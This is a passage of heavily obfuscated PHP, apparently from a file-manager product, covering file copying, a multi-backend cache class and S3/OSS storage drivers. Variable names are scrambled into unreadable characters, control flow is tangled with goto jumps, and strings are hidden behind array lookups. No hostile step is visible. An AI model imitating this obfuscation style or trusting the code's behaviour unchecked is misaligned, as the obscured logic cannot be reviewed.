get_path_father($dŠ³®œÌî); IO::mkdir($dŠ³®œÌî); if (!IO::copy($B²Û»¶í¯, $dŠ³®œÌî, $_SERVER[«¾°Ã¤][792])) { write_log($_SERVER[«¾°Ã¤][793] . $B²Û»¶í¯ . $_SERVER[«¾°Ã¤][776] . $dŠ³®œÌî . $_SERVER[«¾°Ã¤][513], $_SERVER[«¾°Ã¤][751]); $F¾öá¬Ä = !1; break; } } $aÑŒ»³¶›Ô = $DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][456]]; $F´…°Ü”ºŞ += 1; goto B–’Èçƒ¨Ò; cêæğ‘¾ˆÓ: } $Fò­ğëñæ« = count($E¾İ³æÚì¬); $cšÈÃè„íÒ++; } while ($Fò­ğëñæ« == $b«§Õ‚§š¥); $c¿’ÈŠ->end(); goto a¸—ïæ¨Ï; E‹¦Ğ¸Ç…å: $this->_fileFilter($bšªÈé’‹×); return !0; goto BöÊİ’¡ÇÎ; BöÊİ’¡ÇÎ: } private function _fileExist($B«Ñåæ¬–ò, &$B·ó‡å­¦, $cø½Í‚ƒ§Œ) { goto EÚƒ¯³öÉ¦; EÚƒ¯³öÉ¦: $e‡‰Å™Î„è =& $_SERVER[«¾°Ã¤]; $c§ŠÌãÑº– = $B«Ñåæ¬–ò[$e‡‰Å™Î„è[76]]; if (in_array($B«Ñåæ¬–ò[$e‡‰Å™Î„è[456]], $B·ó‡å­¦)) { return !1; } goto D– Ùˆª¤Ó; d½–ôÛ® ¬: if (IO::exist($A¤ÖİöÓ¶·)) { $B·ó‡å­¦[] = $B«Ñåæ¬–ò[$e‡‰Å™Î„è[456]]; return !1; } $Eê×Î¥øÎ´ = array($e‡‰Å™Î„è[791] => $B«Ñåæ¬–ò[$e‡‰Å™Î„è[791]], $e‡‰Å™Î„è[76] => array($e‡‰Å™Î„è[380], "{$A¤ÖİöÓ¶·}\45")); $C‰ éÍ¸™Ë = Model($e‡‰Å™Î„è[756])->where($Eê×Î¥øÎ´)->field($e‡‰Å™Î„è[457])->select(); goto Cƒ©¯„•ª; Cƒ©¯„•ª: $B·ó‡å­¦ = array_merge($B·ó‡å­¦, array_to_keyvalue($C‰ éÍ¸™Ë, $e‡‰Å™Î„è[33], $e‡‰Å™Î„è[456])); return !1; goto d¶ä¦ÆÀ; D– Ùˆª¤Ó: if (!in_array($B«Ñåæ¬–ò[$e‡‰Å™Î„è[791]], $cø½Í‚ƒ§Œ)) { return !1; } if (IO::exist($c§ŠÌãÑº–)) { return !0; } $A¤ÖİöÓ¶· = get_path_father($c§ŠÌãÑº–); goto d½–ôÛ® ¬; d¶ä¦ÆÀ: } private function _fileFilter($B¸šé°«º») { $aÓ‡Œ™ƒÃÔ =& $_SERVER[«¾°Ã¤]; if (empty($B¸šé°«º»)) { return; } $CÄïˆÍÃƒ = array($aÓ‡Œ™ƒÃÔ[456] => array($aÓ‡Œ™ƒÃÔ[7], array_unique($B¸šé°«º»))); $CËÍŞóÓ¬ = Model($aÓ‡Œ™ƒÃÔ[799])->where($CÄïˆÍÃƒ)->field($aÓ‡Œ™ƒÃÔ[404])->select(); foreach ($CËÍŞóÓ¬ as $A‚¦¥‚¾ï) { Model($aÓ‡Œ™ƒÃÔ[799])->remove($A‚¦¥‚¾ï[$aÓ‡Œ™ƒÃÔ[404]], !1); } } private function storeIds() { $B‚Š‰ç£ä =& $_SERVER[«¾°Ã¤]; $D‡´‡ÈŠµ‹ = Model($B‚Š‰ç£ä[736])->listData(); $EšœğÍÏ¡ = array(); $cØÌ›ù…‹· = $GLOBALS[$B‚Š‰ç£ä[6]][$B‚Š‰ç£ä[88]][$B‚Š‰ç£ä[800]]; foreach ($D‡´‡ÈŠµ‹ as $D”åŸ°§“¯) { $DÃ–ª” ©³ = strtolower($D”åŸ°§“¯[$B‚Š‰ç£ä[94]]); if (!isset($cØÌ›ù…‹·[$DÃ–ª” ©³])) { continue; } $CÔÕÔì±ª = $B‚Š‰ç£ä[72] . (isset($cØÌ›ù…‹·[$DÃ–ª” ©³]) ? $cØÌ›ù…‹·[$DÃ–ª” ©³] : ucfirst($DÃ–ª” ©³)); if (!class_exists($CÔÕÔì±ª)) { continue; } $EšœğÍÏ¡[] = $D”åŸ°§“¯[$B‚Š‰ç£ä[393]]; } return $EšœğÍÏ¡; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto C‹œå¹ï×; aÖø„ìÔ¿’: $b¶ñ·”ù = $GLOBALS[$c…£ƒ¡¡ù[6]][$c…£ƒ¡¡ù[347]]; $cíÓŒ÷‹¶æ = $b¶ñ·”ù[$b¶ñ·”ù[$c…£ƒ¡¡ù[801]]]; $e‡¥‚ÖÌ¹˜ = $b¶ñ·”ù[$c…£ƒ¡¡ù[802]]; goto cŒçÚ›éì–; C‹œå¹ï×: $c…£ƒ¡¡ù =& $_SERVER[«¾°Ã¤]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto aÖø„ìÔ¿’; cŒçÚ›éì–: switch ($b¶ñ·”ù[$c…£ƒ¡¡ù[801]]) { case $c…£ƒ¡¡ù[17]: self::$handle = Model($c…£ƒ¡¡ù[803]); break; case $c…£ƒ¡¡ù[804]: self::$handle = new CacheRedis($cíÓŒ÷‹¶æ, $e‡¥‚ÖÌ¹˜); break; case $c…£ƒ¡¡ù[805]: self::$handle = new CacheMemcached($cíÓŒ÷‹¶æ, $e‡¥‚ÖÌ¹˜); break; case $c…£ƒ¡¡ù[193]: self::$handle = new CacheFile($cíÓŒ÷‹¶æ, $e‡¥‚ÖÌ¹˜); break; default: break; } return self::$handle; goto Eøè‰«„ƒŒ; Eøè‰«„ƒŒ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($DêšŒÓ˜¬ò) { if (is_array($DêšŒÓ˜¬ò) || is_object($DêšŒÓ˜¬ò)) { $DêšŒÓ˜¬ò = json_encode($DêšŒÓ˜¬ò); } $DêšŒÓ˜¬ò = rawurlencode($DêšŒÓ˜¬ò); return md5(KOD_SITE_ID . $_SERVER[«¾°Ã¤][71] . $DêšŒÓ˜¬ò); } public static function get($d¤÷ÊÓœİ”, $F»¸®»ã = false) { $bØ’©¬©Ÿ = self::key($d¤÷ÊÓœİ”); if ($F»¸®»ã) { return unserialize(self::init()->get($bØ’©¬©Ÿ)); } if (!isset(self::$memoryCache[$bØ’©¬©Ÿ])) { $Bª”Šêº = self::init()->get($bØ’©¬©Ÿ); self::$memoryCache[$bØ’©¬©Ÿ] = unserialize($Bª”Šêº); } return self::$memoryCache[$bØ’©¬©Ÿ]; } public static function set($B‘‘¾„Ì¿Œ, $eÏ¯¹¥˜¥, $CÅ‡İ©Å¾ = false) { goto F®øÔªèÊ; CÜˆßá©ÄÅ: CacheLock::unlock($B‘‘¾„Ì¿Œ); return $A¢º‡²°¤¶; goto EêÁåò¼ãÏ; a¨ªòšã‡Æ: CacheLock::lock($B‘‘¾„Ì¿Œ); $A¢º‡²°¤¶ = self::init()->set($d¡İÇö–‡¤, serialize($eÏ¯¹¥˜¥), $CÅ‡İ©Å¾); self::$memoryCache[$d¡İÇö–‡¤] = $eÏ¯¹¥˜¥; goto CÜˆßá©ÄÅ; F®øÔªèÊ: $d¡İÇö–‡¤ = self::key($B‘‘¾„Ì¿Œ); if (isset(self::$memoryCache[$d¡İÇö–‡¤]) && self::$memoryCache[$d¡İÇö–‡¤] === $eÏ¯¹¥˜¥) { return !0; } if ($CÅ‡İ©Å¾ === 0) { self::$memoryCache[$d¡İÇö–‡¤] = $eÏ¯¹¥˜¥; return !0; } goto a¨ªòšã‡Æ; EêÁåò¼ãÏ: } public static function getCall($b°ğçì¼´É, $eäßÉ ÷¦, $cœ•¨Æ±ø—, $d™ƒïªÈß‹ = array()) { goto d¼÷ ²Ãù; aà×¡µÉ’: return $dğñ„×áè‚; goto b¸ÜÚïèíÑ; aáêöÇôĞ: $dğñ„×áè‚ = call_user_func_array($cœ•¨Æ±ø—, $d™ƒïªÈß‹); $dğñ„×áè‚ = $dğñ„×áè‚ ? $dğñ„×áè‚ : $cğ¯ˆ×›ƒ[33]; self::set($b°ğçì¼´É, $dğñ„×áè‚, $eäßÉ ÷¦); goto aà×¡µÉ’; d¼÷ ²Ãù: $cğ¯ˆ×›ƒ =& $_SERVER[«¾°Ã¤]; $dğñ„×áè‚ = self::get($b°ğçì¼´É); if ($dğñ„×áè‚ || $dğñ„×áè‚ === $cğ¯ˆ×›ƒ[33]) { return $dğñ„×áè‚; } goto aáêöÇôĞ; b¸ÜÚïèíÑ: } public static function remove($E¸½»Ó´å) { goto aß¥Ãâ„à; eË­é•×: return $CâÎ®ñÜ; goto E´¦•ìŸÄ´; c¹˜°œ„¸‹: CacheLock::lock($E¸½»Ó´å); $CâÎ®ñÜ = self::init()->remove($C¥ßİ×¡£); CacheLock::unlock($E¸½»Ó´å); goto eË­é•×; aß¥Ãâ„à: $C¥ßİ×¡£ = self::key($E¸½»Ó´å); unset(self::$memoryCache[$C¥ßİ×¡£]); self::clearTimeout(); goto c¹˜°œ„¸‹; E´¦•ìŸÄ´: } public static function removeMemory($c‰Ú…³ÂÓ¬) { $a†Åè±Ë‰é = self::key($c‰Ú…³ÂÓ¬); unset(self::$memoryCache[$a†Åè±Ë‰é]); } public static function clearMemory($D²Ÿ£œ“Úß = false) { if ($D²Ÿ£œ“Úß) { $D²Ÿ£œ“Úß = self::key($D²Ÿ£œ“Úß); unset(self::$memoryCache[$D²Ÿ£œ“Úß]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[«¾°Ã¤][806])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[«¾°Ã¤][807])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($CõÚ§ÑÚÜº, $D¡ŸÔÓÇøÌ) { $A½–ßé¤§É =& $_SERVER[«¾°Ã¤]; $this->cachePath = $CõÚ§ÑÚÜº[$A½–ßé¤§É[76]]; $this->prefix = $A½–ßé¤§É[808]; $this->cacheTime = $D¡ŸÔÓÇøÌ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($Fï‹Ÿ §°) { $A³Ü‘‚¨Ú =& $_SERVER[«¾°Ã¤]; $Fï‹Ÿ §° = str_replace(array($A³Ü‘‚¨Ú[809], $A³Ü‘‚¨Ú[97], $A³Ü‘‚¨Ú[70]), $A³Ü‘‚¨Ú[810], $Fï‹Ÿ §°); return $this->cachePath . $A³Ü‘‚¨Ú[811] . $Fï‹Ÿ §° . $A³Ü‘‚¨Ú[812]; } public function set($B´¼ô‹¿Ê, $b—÷¼ÔÛê‡, $FÇ„Î„Áß = false) { $DÀÓ©¥±õè = $this->getFile($B´¼ô‹¿Ê); if (file_put_contents($DÀÓ©¥±õè, $this->prefix . $b—÷¼ÔÛê‡, LOCK_EX)) { @touch($DÀÓ©¥±õè, intval(time() + $FÇ„Î„Áß)); clearstatcache(); return !0; } @unlink($DÀÓ©¥±õè); return !1; } public function get($a²®ùâÊŠ‹) { $a·í·¾Í—— = $this->getFile($a²®ùâÊŠ‹); if (file_exists($a·í·¾Í——) && filemtime($a·í·¾Í——) < time()) { @unlink($a·í·¾Í——); return !1; } $Fé…Â¤‹‡ = @file_get_contents($a·í·¾Í——); return substr($Fé…Â¤‹‡, strlen($this->prefix)); } public function remove($Aªó·’“¡È) { $A½İŒ–ìµÙ = $this->getFile($Aªó·’“¡È); return @unlink($A½İŒ–ìµÙ); } public function deleteAll() { $cˆã¾‘ÖÉ‚ =& $_SERVER[«¾°Ã¤]; $Eî‘„¿À¤² = scandir($this->cachePath); foreach ($Eî‘„¿À¤² as $aÊÃŒ‘ÌËÈ) { $EÁé‡½ƒ¦² = $this->cachePath . $aÊÃŒ‘ÌËÈ; if (strpos($EÁé‡½ƒ¦², $cˆã¾‘ÖÉ‚[812]) && strpos($EÁé‡½ƒ¦², $cˆã¾‘ÖÉ‚[813])) { @unlink($EÁé‡½ƒ¦²); } } } public function clearTimeout() { $d¤Œóˆ¶¹¶ =& $_SERVER[«¾°Ã¤]; $C“í©…éßä = scandir($this->cachePath); foreach ($C“í©…éßä as $e¸›ø…ÆÚî) { $cÇ¯ÅùÛÈÛ = $this->cachePath . $e¸›ø…ÆÚî; if (strpos($cÇ¯ÅùÛÈÛ, $d¤Œóˆ¶¹¶[812]) && strpos($cÇ¯ÅùÛÈÛ, $d¤Œóˆ¶¹¶[813]) && filemtime($cÇ¯ÅùÛÈÛ) < time()) { @unlink($cÇ¯ÅùÛÈÛ); } } } } goto Cóºí¹ßâ; f®º²ß¿ƒÎ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($CÜˆ–ïÎ÷) { parent::__construct($CÜˆ–ïÎ÷); $this->signatureVersion($_SERVER[«¾°Ã¤][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($B«ëöÜÚÈº) { parent::__construct($B«ëöÜÚÈº); $this->signatureVersion($_SERVER[«¾°Ã¤][212]); } public function fileOutLink($BÊ´ô¾†§Æ) { $E¯Œ¸Òî¬ =& $_SERVER[«¾°Ã¤]; if (substr($BÊ´ô¾†§Æ, 0, 7) == $E¯Œ¸Òî¬[1205]) { $BÊ´ô¾†§Æ = $E¯Œ¸Òî¬[1206] . substr($BÊ´ô¾†§Æ, 7); } header($E¯Œ¸Òî¬[159] . $BÊ´ô¾†§Æ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Bõ¼Ææ‘Ê) { parent::__construct(); include_once SDK_DIR . $_SERVER[«¾°Ã¤][1261]; $this->_init($Bõ¼Ææ‘Ê); } public function _init($b˜Ó¸İ£¾Ø) { $Eâ†æ¹Õ÷± =& $_SERVER[«¾°Ã¤]; foreach ($b˜Ó¸İ£¾Ø as $EÅ˜ôó˜“‚ => $D‚ÛšÅğ³„) { if (isset($this->{$EÅ˜ôó˜“‚})) { $this->{$EÅ˜ôó˜“‚} = $D‚ÛšÅğ³„; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Eâ†æ¹Õ÷±[1262] . LNG($Eâ†æ¹Õ÷±[1263])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto b´ª’¯«¤™; aã„ì‘Ò¶ô: $eÑäõ›«¶Æ->addAllowedMethod($a»á®®Ğ¯Õ[1267]); $eÑäõ›«¶Æ->addAllowedMethod($a»á®®Ğ¯Õ[1268]); $eÑäõ›«¶Æ->addAllowedMethod($a»á®®Ğ¯Õ[158]); goto bÊèÖ£êÙ¥; BëÃ¶É: $eÑäõ›«¶Æ->addAllowedOrigin($a»á®®Ğ¯Õ[1264]); $eÑäõ›«¶Æ->addAllowedMethod($a»á®®Ğ¯Õ[1265]); $eÑäõ›«¶Æ->addAllowedMethod($a»á®®Ğ¯Õ[1266]); goto aã„ì‘Ò¶ô; aŸ¿´©ƒí: $c§Œ„½ŠÄ->addRule($eÑäõ›«¶Æ); try { $this->client->putBucketCors($this->bucket, $c§Œ„½ŠÄ); } catch (OSS\Core\OssException $Fæ•Å«Œ†Ü) { return !1; } return !0; goto aÚ©®É±éŞ; bÊèÖ£êÙ¥: $eÑäõ›«¶Æ->setMaxAgeSeconds(600); $eÑäõ›«¶Æ->addExposeHeader($a»á®®Ğ¯Õ[1269]); $eÑäõ›«¶Æ->addAllowedHeader($a»á®®Ğ¯Õ[1264]); goto aŸ¿´©ƒí; b´ª’¯«¤™: $a»á®®Ğ¯Õ =& $_SERVER[«¾°Ã¤]; $c§Œ„½ŠÄ = new OSS\Model\CorsConfig(); $eÑäõ›«¶Æ = new OSS\Model\CorsRule(); goto BëÃ¶É; aÚ©®É±éŞ: } public function getBucketCors() { goto FŠóÒ‡”æ; c†±¯àáÒÆ: $d¨ŒñÍìÓ÷ = $a—ÄÏÛÛ¹’[0]->getMaxAgeSeconds(); $aÆ‘¢™Ë = $a—ÄÏÛÛ¹’[0]->getExposeHeaders(); $Cåğ¢Û¹¬ = $a—ÄÏÛÛ¹’[0]->getAllowedHeaders(); goto A•Ñô’Áé; a‘³œËœ­: if (!$D·òÓŞøö || !($a—ÄÏÛÛ¹’ = $D·òÓŞøö->getRules())) { return null; } $eà£š™öˆŸ = $a—ÄÏÛÛ¹’[0]->getAllowedOrigins(); $d´¨¨ß…È˜ = $a—ÄÏÛÛ¹’[0]->getAllowedMethods(); goto c†±¯àáÒÆ; FŠóÒ‡”æ: $E‚÷³í²åâ =& $_SERVER[«¾°Ã¤]; $D·òÓŞøö = null; try { $D·òÓŞøö = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $f÷–è‹‰§) { return null; } goto a‘³œËœ­; A•Ñô’Áé: return array($E‚÷³í²åâ[181] => isset($eà£š™öˆŸ[0]) ? $eà£š™öˆŸ[0] : $E‚÷³í²åâ[33], $E‚÷³í²åâ[185] => $d´¨¨ß…È˜, $E‚÷³í²åâ[1270] => $d¨ŒñÍìÓ÷, $E‚÷³í²åâ[1271] => isset($aÆ‘¢™Ë[0]) ? $aÆ‘¢™Ë[0] : $E‚÷³í²åâ[33], $E‚÷³í²åâ[183] => isset($Cåğ¢Û¹¬[0]) ? $Cåğ¢Û¹¬[0] : $E‚÷³í²åâ[33]); goto e—íšÎåï; e—íšÎåï: } public function isBucketCors() { goto aÈ˜íÇ½ŸÈ; E¶¥Äµí: $aáä£®À¥¥ = array($bÆ®…¤•âŠ[186], $bÆ®…¤•âŠ[187], $bÆ®…¤•âŠ[188], $bÆ®…¤•âŠ[189], $bÆ®…¤•âŠ[190]); $CŒğÈ¢ê»Á = array_diff($aáä£®À¥¥, $Fò§ùßµ’); return empty($CŒğÈ¢ê»Á); goto f¦¥—â¬®»; f½†…Ü±¹½: if ($dÃÚàÏ¾î[$bÆ®…¤•âŠ[181]] != $bÆ®…¤•âŠ[182] || $dÃÚàÏ¾î[$bÆ®…¤•âŠ[183]] != $bÆ®…¤•âŠ[182]) { return !1; } $Fò§ùßµ’ = array_map($bÆ®…¤•âŠ[184], $dÃÚàÏ¾î[$bÆ®…¤•âŠ[185]]); if (!is_array($Fò§ùßµ’)) { $Fò§ùßµ’ = array(); } goto E¶¥Äµí; aÈ˜íÇ½ŸÈ: $bÆ®…¤•âŠ =& $_SERVER[«¾°Ã¤]; $dÃÚàÏ¾î = $this->getBucketCors(); if (!$dÃÚàÏ¾î || !is_array($dÃÚàÏ¾î)) { return !1; } goto f½†…Ü±¹½; f¦¥—â¬®»: } public function mkfile($C½¼Šèòª×, $E±–²œÁ™™ = '', $bƒ×‚†ÏÂ¼ = REPEAT_RENAME) { $Bªò¥Œ²ò = $this->setContent($C½¼Šèòª×, $E±–²œÁ™™); if ($Bªò¥Œ²ò !== !1) { return $this->getPathOuter($C½¼Šèòª×); } return !1; } public function mkdir($d°”§ ’â‡, $E³İêìâ¡ì = REPEAT_SKIP) { if ($this->_isFolder($d°”§ ’â‡)) { return $this->getPathOuter($d°”§ ’â‡); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($d°”§ ’â‡)); } catch (OSS\Core\OssException $F—…Ò«—©¹) { return !1; } return $this->getPathOuter($d°”§ ’â‡); } private function fileList($dğƒ²á„¬ã, $dËöïøë‘ğ = '', $Câãğ¢ƒ·Œ = 0) { goto FÖİ£‡¦–œ; FÖİ£‡¦–œ: $C½‘µæŠõ =& $_SERVER[«¾°Ã¤]; $dğƒ²á„¬ã = trim($dğƒ²á„¬ã, $C½‘µæŠõ[8]); $FîÏ¹³Ä²¸ = empty($dğƒ²á„¬ã) && $dğƒ²á„¬ã !== $C½‘µæŠõ[191] ? $C½‘µæŠõ[33] : $dğƒ²á„¬ã . $C½‘µæŠõ[8]; goto F»Ñºåù“Ş; EÇ„ã…Ïæ: return array($C½‘µæŠõ[75] => $cØ®éŠåàÔ, $C½‘µæŠõ[74] => $fŠáëò„ˆ); goto Aö…¿–Â¿; F»Ñºåù“Ş: $c¾äñĞ¡Éã = $C½‘µæŠõ[33]; $EÖ¢Æ—™†ˆ = 1000; $BÌÍÔ¬§ = $this->listItemCache === !1 ? !1 : !0; goto d¡‰âë—´; d¡‰âë—´: $cØ®éŠåàÔ = $fŠáëò„ˆ = array(); while (!0) { check_abort(); $FŒ§º‡æ« = array($C½‘µæŠõ[1272] => $dËöïøë‘ğ, $C½‘µæŠõ[1273] => $FîÏ¹³Ä²¸, $C½‘µæŠõ[1274] => $EÖ¢Æ—™†ˆ, $C½‘µæŠõ[1275] => $c¾äñĞ¡Éã); try { $eÆÛ·‰²Ï³ = $this->client->listObjects($this->bucket, $FŒ§º‡æ«); } catch (OSS\Core\OssException $F´·õÈˆà) { break; } $c¾äñĞ¡Éã = $eÆÛ·‰²Ï³->getNextMarker(); $DÔÆ§½‚©± = $eÆÛ·‰²Ï³->getObjectList(); $FêĞÙ¡™ß = $eÆÛ·‰²Ï³->getPrefixList(); foreach ($DÔÆ§½‚©± as $b¹ê§Óœ™) { goto e„çÌ•Šå´; e‚¬İççƒ«: if ($BÌÍÔ¬§) { $this->cacheMethod($C½‘µæŠõ[199], $CĞÅÙ‡ÍİÉ, $DÌ°‘ˆÖ×); $this->cacheMethod($C½‘µæŠõ[200], $CĞÅÙ‡ÍİÉ, array($C½‘µæŠõ[78] => $f÷äöÏ™‡î, $C½‘µæŠõ[1276] => $f÷äöÏ™‡î, $C½‘µæŠõ[84] => strtotime($f‡•Øº©¨Õ), $C½‘µæŠõ[1277] => $f‡•Øº©¨Õ)); } if ($DÌ°‘ˆÖ×) { $cØ®éŠåàÔ[] = $CĞÅÙ‡ÍİÉ; continue; } $fŠáëò„ˆ[] = $bÀéù”Ê‡ø; goto CŒö›ò¾ë; e„çÌ•Šå´: if ($b¹ê§Óœ™->getKey() == $FîÏ¹³Ä²¸) { continue; } $CĞÅÙ‡ÍİÉ = $b¹ê§Óœ™->getKey(); $f÷äöÏ™‡î = $b¹ê§Óœ™->getSize(); goto dàÀ†¥Ó°ƒ; dàÀ†¥Ó°ƒ: $f‡•Øº©¨Õ = $b¹ê§Óœ™->getLastModified(); $bÀéù”Ê‡ø = $Câãğ¢ƒ·Œ ? array($C½‘µæŠõ[28] => $CĞÅÙ‡ÍİÉ, $C½‘µæŠõ[78] => $f÷äöÏ™‡î, $C½‘µæŠõ[197] => strtotime($f‡•Øº©¨Õ)) : $CĞÅÙ‡ÍİÉ; $DÌ°‘ˆÖ× = $f÷äöÏ™‡î == 0 && substr($CĞÅÙ‡ÍİÉ, strlen($CĞÅÙ‡ÍİÉ) - 1, 1) == $C½‘µæŠõ[8] ? !0 : !1; goto e‚¬İççƒ«; CŒö›ò¾ë: } foreach ($FêĞÙ¡™ß as $D„¡º³’ƒí) { $cØ®éŠåàÔ[] = $D„¡º³’ƒí->getPrefix(); if ($BÌÍÔ¬§) { $this->cacheMethod($C½‘µæŠõ[199], $CĞÅÙ‡ÍİÉ, !0); } } if ($c¾äñĞ¡Éã === $C½‘µæŠõ[33]) { break; } } if ($BÌÍÔ¬§) { $this->cacheMethod($C½‘µæŠõ[199], $dğƒ²á„¬ã, !0); } goto EÇ„ã…Ïæ; Aö…¿–Â¿: } public function copyFile($fõº„Ô™á‹, $A—³ùŸ«ïÌ) { $f÷å­£µ‚Ò = $this->size($fõº„Ô™á‹); if ($f÷å­£µ‚Ò < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $fõº„Ô™á‹, $this->bucket, $this->pathEncode($A—³ùŸ«ïÌ)); } catch (OSS\Core\OssException $AÖœæäøÀ©) { return !1; } return $this->getPathOuter($A—³ùŸ«ïÌ); } $aóËçà‹ = $this->multiCopyObject($fõº„Ô™á‹, $A—³ùŸ«ïÌ, $f÷å­£µ‚Ò); return $aóËçà‹ ? $this->getPathOuter($A—³ùŸ«ïÌ) : !1; } private function multiCopyObject($CÍñó…Éò, $B³§ÚƒÃš¹, $cÉí¡«…À) { $AÄ÷ö¹“º =& $_SERVER[«¾°Ã¤]; try { goto dïˆÔÁÁçó; fï£‰ÔÜƒ: $díéĞÎ„è‚ = 1024 * 1024 * 10; $f”¬Ø¯¿½ = $this->client->generateMultiuploadParts($cÉí¡«…À, $díéĞÎ„è‚); foreach ($f”¬Ø¯¿½ as $d‰°’Ââ => $D³ä‚öğ’) { $fŒ¸ãé‹“§ = $a£ÑÓïÙ ‹ + (int) $D³ä‚öğ’[$AÄ÷ö¹“º[1279]]; $FÛ—Ö ·²Š = (int) $D³ä‚öğ’[$AÄ÷ö¹“º[335]] + $fŒ¸ãé‹“§ - 1; $Eö—¥ù‘¹ = array($AÄ÷ö¹“º[1280] => $fŒ¸ãé‹“§, $AÄ÷ö¹“º[1281] => $FÛ—Ö ·²Š); $DÒÄÖˆ‘åİ[] = $this->client->uploadPartCopy($this->bucket, $CÍñó…Éò, $this->bucket, $this->pathEncode($B³§ÚƒÃš¹), $fÙƒƒ¹éÛ×, $B‘Õæ¤÷©‡, $Eö—¥ù‘¹); $fÙƒƒ¹éÛ× = $fÙƒƒ¹éÛ× + 1; } goto bë¯ŸóÁÕñ; dïˆÔÁÁçó: $aÇ¢Ğ„™× = array(); if ($cÓÔßÔ = $this->hashMd5($CÍñó…Éò)) { $aÇ¢Ğ„™× = array(OSS\OssClient::OSS_HEADERS => array($AÄ÷ö¹“º[1278] => $cÓÔßÔ)); } $B‘Õæ¤÷©‡ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B³§ÚƒÃš¹), $aÇ¢Ğ„™×); goto fĞäÜ™¢¡š; bë¯ŸóÁÕñ: $A’Üíî¼š = array(); foreach ($DÒÄÖˆ‘åİ as $d‰°’Ââ => $c‘ÛˆËÇĞ) { $A’Üíî¼š[] = array($AÄ÷ö¹“º[1282] => $d‰°’Ââ + 1, $AÄ÷ö¹“º[1283] => $c‘ÛˆËÇĞ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($B³§ÚƒÃš¹), $B‘Õæ¤÷©‡, $A’Üíî¼š); goto eÇš½ßâÙà; fĞäÜ™¢¡š: $fÙƒƒ¹éÛ× = 1; $a£ÑÓïÙ ‹ = 0; $DÒÄÖˆ‘åİ = array(); goto fï£‰ÔÜƒ; eÇš½ßâÙà: } catch (OSS\Core\OssException $b·ÛÄˆ·™“) { return !1; } return !0; } public function moveFile($b³‰¡¦ã×–, $f™ÑÎù÷’²) { if ($this->copyFile($b³‰¡¦ã×–, $f™ÑÎù÷’²)) { $this->remove($b³‰¡¦ã×–); return $this->getPathOuter($f™ÑÎù÷’²); } return !1; } public function delFile($cÁ™ç†é‚‘) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($cÁ™ç†é‚‘)); } catch (OSS\Core\OssException $CÊòˆ¿÷Ø‘) { return !1; } return !0; } public function delFolder($E¥Óæš«›¨) { goto f‘ö× Ûİñ; C÷µ×³ôÀ: if (!empty($E¥Óæš«›¨) && $E¥Óæš«›¨ !== $cÊ ‘Õ°ÕÁ[191] && !in_array($E¥ÕòëŸß, $FÙ—™ˆÏ•[$cÊ ‘Õ°ÕÁ[75]])) { $FÙ—™ˆÏ•[$cÊ ‘Õ°ÕÁ[75]][] = $E¥ÕòëŸß; } $B´³Óß´… = $this->delByBatch($FÙ—™ˆÏ•[$cÊ ‘Õ°ÕÁ[74]]); if (!$B´³Óß´…) { return !1; } goto C„‘¯Ï¯À…; f‘ö× Ûİñ: $cÊ ‘Õ°ÕÁ =& $_SERVER[«¾°Ã¤]; if (!$this->exist($E¥Óæš«›¨)) { return !0; } $this->listItemCache = !1; goto cùÆšË¡ˆ¤; C„‘¯Ï¯À…: $B´³Óß´… = $this->delByBatch($FÙ—™ˆÏ•[$cÊ ‘Õ°ÕÁ[75]]); if (!$B´³Óß´…) { return !1; } return $this->delFile($E¥ÕòëŸß); goto B¸‚ùßÏŠØ; cùÆšË¡ˆ¤: $FÙ—™ˆÏ• = $this->fileList($E¥Óæš«›¨); $this->listItemCache = !0; $E¥ÕòëŸß = trim($E¥Óæš«›¨, $cÊ ‘Õ°ÕÁ[8]) . $cÊ ‘Õ°ÕÁ[8]; goto C÷µ×³ôÀ; B¸‚ùßÏŠØ: } private function delByBatch($b½Œù¥İÈ) { foreach (array_chunk($b½Œù¥İÈ, 1000) as $EåóâÓ„á®) { try { $this->client->deleteObjects($this->bucket, $EåóâÓ„á®); } catch (OSS\Core\OssException $dÏò…È÷Œ«) { return !1; } } return !0; } public function rename($EËÜ®Íˆì°, $ašïß®•Ü) { return $this->renameObject($EËÜ®Íˆì°, $ašïß®•Ü); } private function fileInfo($cŞƒ‚Ø¨©, $C¯‚Ôæ»× = false, $eŠŒŸë´î = array()) { goto fßî¦­‹µ; F‡í†î¡Ô: $fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[194]] = $fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[84]] = 0; $fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[195]] = $fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[196]] = !0; if (empty($eŠŒŸë´î)) { $DÙÜ×—ùµñ = $this->objectMeta($cŞƒ‚Ø¨©); if (!$DÙÜ×—ùµñ) { return $fôÒŒ‚ô‹ñ; } $eŠŒŸë´î = array($dÙ—²¶­Œ[84] => strtotime($DÙÜ×—ùµñ[$dÙ—²¶­Œ[1277]]), $dÙ—²¶­Œ[78] => 